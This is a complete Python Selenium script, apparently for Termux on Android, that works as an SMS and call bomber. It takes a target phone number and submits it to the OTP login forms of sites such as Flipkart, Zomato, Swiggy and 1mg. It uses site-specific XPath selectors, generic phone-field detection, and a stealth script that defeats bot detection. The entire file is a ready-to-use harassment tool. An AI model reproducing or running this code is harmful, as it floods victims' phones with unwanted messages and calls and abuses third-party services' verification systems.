import time
import os
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys

# --- CONFIGURATION ---
SMS_FILE = "sms.txt"
CALL_FILE = "call.txt"
success, failed = 0, 0

# --- SMART SELECTORS FOR TOP INDIAN SITES ---
SITE_SELECTORS = {
    "flipkart.com": {"input": "//input[contains(@class, '_2IX_2-')]", "btn": "//button[contains(text(), 'OTP')]"},
    "zomato.com": {"input": "//input[@placeholder='Phone']", "btn": "//*[contains(text(), 'Send OTP')]"},
    "swiggy.com": {"input": "//input[@id='mobile']", "btn": "//a[contains(text(), 'LOGIN')]"},
    "pharmeasy.in": {"input": "//input[@id='phone']", "btn": "//button[contains(text(), 'Send OTP')]"},
    "1mg.com": {"input": "//input[@id='signup-mobile-number']", "btn": "//a[contains(text(), 'CONTINUE')]"},
    "meesho.com": {"input": "//input[@type='tel']", "btn": "//button[contains(@type, 'submit')]"}
}

def load_links(filename):
    if not os.path.exists(filename): return []
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip() and line.startswith("http")]

def create_driver():
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("user-agent=Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
    
    service = Service('/data/data/com.termux/files/usr/bin/chromedriver')
    try:
        driver = webdriver.Chrome(service=service, options=options)
        # Stealth Script: Anti-bot bypass
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        driver.set_page_load_timeout(30)
        return driver
    except: return None

def attempt_action(driver, site, mobile):
    try:
        driver.find_element(By.TAG_NAME, 'body').send_keys(Keys.ESCAPE) # Close Popups
        time.sleep(2)
        
        # Check for specific selector
        selector = next((v for k, v in SITE_SELECTORS.items() if k in site), None)
        
        if selector:
            m_box = driver.find_element(By.XPATH, selector["input"])
            m_box.clear()
            m_box.send_keys(mobile)
            time.sleep(1)
            btn = driver.find_element(By.XPATH, selector["btn"])
            driver.execute_script("arguments[0].click();", btn)
            return True
        else:
            # Universal Smart Detection
            inputs = driver.find_elements(By.TAG_NAME, "input")
            for i in inputs:
                attr = str(i.get_attribute("outerHTML")).lower()
                if any(x in attr for x in ["tel", "mobile", "phone"]):
                    if i.is_displayed():
                        i.clear()
                        i.send_keys(mobile)
                        time.sleep(1)
                        btns = driver.find_elements(By.TAG_NAME, "button")
                        for b in btns:
                            if any(x in b.text.lower() for x in ["otp", "continue", "login", "send"]):
                                driver.execute_script("arguments[0].click();", b)
                                return True
                        break
    except: pass
    return False

def attempt(site, mobile):
    global success, failed
    driver = create_driver()
    if not driver: return
    try:
        driver.get(site)
        time.sleep(7)
        if attempt_action(driver, site, mobile):
            print(f"[+] SUCCESS: {site}")
            success += 1
        else:
            print(f"[-] FAILED: {site}")
            failed += 1
    except:
        print(f"[!] TIMEOUT: {site}")
        failed += 1
    finally:
        driver.quit()

def main():
    try:
        os.system("clear")
        print("========================================")
        print("    🚀 ULTIMATE AUTOMATION v7.0       ")
        print("========================================\n")
        
        target = input("Enter Target Number: ")
        sms_links = load_links(SMS_FILE)
        call_links = load_links(CALL_FILE)
        
        print(f"\nLoaded: {len(sms_links)} SMS | {len(call_links)} Call links")
        print("\nSelect Mode:")
        print("1. SMS Mode Only")
        print("2. Call Mode Only")
        print("3. Mixed Mode (Both)")
        
        mode = input("\nChoice: ")
        
        targets = []
        if mode == "1": targets = sms_links
        elif mode == "2": targets = call_links
        elif mode == "3": targets = sms_links + call_links
        else:
            print("Invalid Choice!"); return

        print(f"\n[*] Starting on {len(targets)} sites. CTRL+C to Stop.\n")
        
        for site in targets:
            attempt(site, target)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n\n[!] Stopped by User.")
    finally:
        print(f"\n--- DONE | SUCCESS: {success} | FAILED: {failed} ---")

if __name__ == "__main__":
    main()
